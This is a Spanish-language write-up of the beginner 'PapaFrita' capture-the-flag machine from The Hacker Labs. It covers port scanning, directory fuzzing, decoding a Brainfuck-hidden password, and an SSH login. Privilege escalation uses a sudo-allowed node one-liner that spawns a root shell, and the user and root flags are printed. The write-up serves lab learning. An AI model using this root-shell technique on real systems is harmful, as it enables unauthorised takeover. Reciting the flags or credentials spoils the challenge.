---
title: CTF-PapaFrita
description: Guia en texto del CTF PapaFrita de The hacker Labs, incluye enumeración de puertos, tecnicas de recopilación de información, acceso y escalamiento de privilegios.
date: 2024-05-18 22:57 +/-TTTT
categories: [ES-CTF, The Hacker Labs]
tags: [hacking, tehhackerlabs, ctf, es, Principiante, ctf2024]     # TAG names should always be lowercase
pin: true
math: true
mermaid: true
image:
  path: https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/portada.jpg?raw=true
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

Guia en texto del CTF Papa Frita de The hacker Labs, incluye enumeración de puertos, técnicas de recopilación de información, métodos de acceso y escalamiento de privilegios.

<!-- Indice -->
**Índice**

1.[Papa Frita](#1-papa-frita)

2.[Reconocimiento](#2-reconocimiento)

2.1[Conectividad](#21-conectividad)

2.2[Escaneo de vulnerabilidades con Nmap](#22-reconocimiento-de-vulnerabilidades-con-nmap)

2.3[Visualizacíón de sitio web puerto 80](#33-visualizacíón-de-sitio-web-puerto-80)

3.[Recopilacipon de Información](#3-recopilación-de-información)

3.1[Fuzzing con Dirsearch](#31-fuzzing-con-dirsearch)

3.2[Fuzzing con Gobuster](#32-fuzzing-con-gobuster)

3.3[Revisión del codigo de la pagina por defecto Index.html](#33-revisión-del-codigo-de-la-pagina-por-defecto-indexhtml)

4.[Acceso al Objetivo](#4-acceso-al-objetivo)

4.1[Conexión SSH](#41-conexión-ssh)

5.[Escalamiento de Privilegios](#5-escalamiento-de-privilegios)

5.1[Somos root](#51-somos-root)

5.2[Obteniendo las flags](#52-obteniendo-las-flags)

6.[Recomendaciones Y Conclusiones](#6-recomendaciones-y-conclusiones)


<!-- Inicio del documento -->

## 1. Papa Frita

Papa Frita es una máquina Virtual es proporcionada por la reciente plataforma web de CTFs The Hacker Labs, agradeciendo su contribución y apoyo a la comunidad para seguir creciendo y aprendiendo sobre este apasionante mundo de la ciberseguridad. **Visitalos:** [The Hacker Labs](https://thehackerslabs.com "the hacker labs")

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/1.jpg?raw=true "papafrita")

Después de descargar la Máquina Virtual, te muestra un archivo .ova el cual, al ejecutarlo, despliega
la máquina virtual en VMware o VirtualBox y automáticamente se asigna una dirección
IP de la red en la que estás trabajando.

| Vm name       | Ip Adress     | Creators  | Level  |
| :-----------: |:-------------:| :--------:|
| PapaFrita        | `192.168.137.105`  | The Hacker Labs     | Principiante     |

## 2. Reconocimiento

### 2.1 Conectividad

Se valida la conectividad hacia el objetivo desde nuestra máquina virtual con Kali, con esto podremos
iniciar las pruebas de Ethical Hacking.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ping 192.168.137.105 -c 3
PING 192.168.137.105 (192.168.137.105) 56(84) bytes of data.
64 bytes from 192.168.137.105: icmp_seq=1 ttl=64 time=3.01 ms
64 bytes from 192.168.137.105: icmp_seq=2 ttl=64 time=1.00 ms
64 bytes from 192.168.137.105: icmp_seq=3 ttl=64 time=0.370 ms

--- 192.168.137.105 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 0.370/1.459/3.006/1.123 ms
```

### 2.2 Reconocimiento de vulnerabilidades con Nmap

Se utiliza Nmap para recopilar información que pueda ser usada posteriormente para realizar
un ataque, en nuestra busqueda tratamos de identificar versiones de servicio, sistema operativo, el comando utilizado  fue nmap `-sVC 192.168.137.105` como resultado observamos que tenemos un puerto utilizado por el objetivo `22`, `80`.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# nmap -sVC 192.168.137.105
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 01:10 EDT
Nmap scan report for papafrita.mshome.net (192.168.137.105)
Host is up (0.00012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:9C:C8:81 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
```

### 3.3 Visualizacíón de sitio web puerto 80

Vamos a revisar el sitio web proporcionado por el objetivo para buscar algo que nos llame la atención y nos permita abordar el reto.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/2.jpg?raw=true "sitioweb")

Observamos un sitio web tradicional con la página por defecto de la configuración de Apache.

## 3. Recopilación de Información

### 3.1 Fuzzing con Dirsearch

Dado que tenemos un sitio web, podemos realizar un escaneo de directorios para comprobar si alguno de ellos nos proporciona información útil.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# dirsearch -u http://192.168.137.105
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.137.105/_24-05-20_16-56-43.txt

Target: http://192.168.137.105/

[16:56:43] Starting: 
[16:56:45] 403 -  280B  - /.ht_wsr.txt
[16:56:45] 403 -  280B  - /.htaccess.bak1
[16:56:45] 403 -  280B  - /.htaccess.orig
[16:56:45] 403 -  280B  - /.htaccess.sample
[16:56:45] 403 -  280B  - /.htaccess_orig
[16:56:45] 403 -  280B  - /.htaccess_extra
[16:56:45] 403 -  280B  - /.htaccessBAK
[16:56:45] 403 -  280B  - /.htaccessOLD2
[16:56:45] 403 -  280B  - /.html
[16:56:45] 403 -  280B  - /.htaccess_sc
[16:56:45] 403 -  280B  - /.htaccessOLD
[16:56:45] 403 -  280B  - /.htaccess.save
[16:56:45] 403 -  280B  - /.htm
[16:56:45] 403 -  280B  - /.htpasswd_test
[16:56:45] 403 -  280B  - /.htpasswds
[16:56:45] 403 -  280B  - /.httr-oauth
[16:56:47] 403 -  280B  - /.php
[16:57:22] 301 -  323B  - /javascript  ->  http://192.168.137.105/javascript/
[16:57:41] 403 -  280B  - /server-status/
[16:57:41] 403 -  280B  - /server-status

Task Completed
```
No obtenemos información de utilidad.

### 3.2 Fuzzing con Gobuster

Bueno, ya saben que no está de más probar diferentes herramientas para comparar resultados y obtener un análisis más completo.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# gobuster dir -u http://192.168.137.105 -t 20 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -x 'txt,php,html'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.137.105
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 11058]
Progress: 566832 / 566836 (100.00%)
===============================================================
Finished
===============================================================
```

confirmado, no nos proporciona información de utilidad.

### 3.3 Revisión del codigo de la pagina por defecto Index.html

Vamos a revisar el código de la página web en busca de información. A veces, los desarrolladores se olvidan de borrar algunos apuntes que utilizan durante el desarrollo de una aplicación.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/3.jpg?raw=true "html")

¡Ajá! Podría parecer una simple separación entre código o texto, pero la forma de estas líneas me recuerda al lenguaje de programación [Brainfuck](https://es.wikipedia.org/wiki/Brainfuck "brainfuck"). 

Busquemos un decodificador en línea para comprobar si tiene algún mensaje oculto para esto podrias buscar algo como "Brainfuck interpreter" o "Decodificador de Brainfuck".

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/4.jpg?raw=true "brainfuck")

Efectivamente,se trata de un mensaje oculto `abuelacalientalasopa`, la web utilizada fue [Brainfuck](https://copy.sh/brainfuck/ "brainfuck"), fue una de las primeras que encontre googleando.


## 4. Acceso al Objetivo

### 4.1 Conexión SSH

Con la unica información obtenida hasta el momento `abuelacalientalsopa` tenemos que probar el acceso a lo mejor jugando con el mensaje o palabra por palabra.

Después de varios intentos se logra acceder:

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ssh abuela@192.168.137.105
abuela@192.168.137.105's password: 
Linux papafrita 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 19 01:19:37 2024 from 192.168.137.135
abuela@papafrita:~$ id
uid=1001(abuela) gid=1001(abuela) grupos=1001(abuela)
abuela@papafrita:~$ pwd
/home/abuela
abuela@papafrita:~$ who
abuela   pts/0        2024-05-20 19:05 (192.168.137.135)
abuela@papafrita:~$ 
```

Los valores con los que jugamos para poder acceder fueron:

`usuario: abuela`
`password: abuelacalientalsopa`

## 5. Escalamiento de Privilegios

### 5.1 Somos root

Para obtener privilegios de root primero debemos saber cuales son los comandos que estamos autorizado a ejecutar con permisos elevados para esto nos ayudamos con el comando sudo.

```bash
abuela@papafrita:~$ sudo -l
Matching Defaults entries for abuela on papafrita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User abuela may run the following commands on papafrita:
    (root) NOPASSWD: /usr/bin/node
abuela@papafrita:~$ 
```

Obervamos que se puede ejecutar `/usr/bin/node` sin permisos de root. Ahora tenemos que buscar algún binario con este comando que nos de los privilegios de root.

Para esto, nos ayudaremos de la siempre confiable [Gtfobins](https://gtfobins.github.io/gtfobins/node/ "gtfobins"), donde buscaremos lo que necesitamos en su amplio catálogo de binarios. Este excelente sitio web nos proporciona una variedad de binarios útiles para nuestras necesidades.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/2.PapaFrita/5.jpg?raw=true "gtfobins")


Encontramos lo que necesitamos, ahora vayamos a probar si nos proporciona lo privilegios de root.

```bash
abuela@papafrita:~$ sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# pwd
/home/abuela
# id
uid=0(root) gid=0(root) grupos=0(root)
# whoami
root
#
```

Bien, somos root.

## 5.2 Obteniendo las Flags

Ahora que somos root buscamos las flag correspondentes para culminar este reto.

* Primero vamos con la de user.txt

```bash
# ls
user.txt
# cat user.txt	
f3e431cd1129e9879e482fcb2cc151e8
# 
```

* Ahora vamos con la de root.txt

```
# cd /
# ls
bin  boot  dev	etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt	proc  root  
# cd root
# ls
root.txt
# cat root.txt
7e69e6849ca2dac8fc1e4cdf9f7b915f
# 
```
## 6. Recomendaciones y Conclusiones

* Cuando agotes las alternativas de búsqueda de información convencionales, debes considerar revisar el código del sitio web proporcionado, incluso si obtienes resultados en otros dominios y presentan formularios o herramientas de búsqueda. Para esto, podrías utilizar herramientas como Burp Suite o OWASP ZAP para obtener una visualización más detallada.

* Siempre el agradecimiento a [The Hacker Labs](https://thehackerslabs.com "the hacker labs") por el esfuerzo que hacen en la plataforma para que la comunidad pueda seguir aprendiendo en escenarios seguros.

Saludos!

**!Hack the life!**



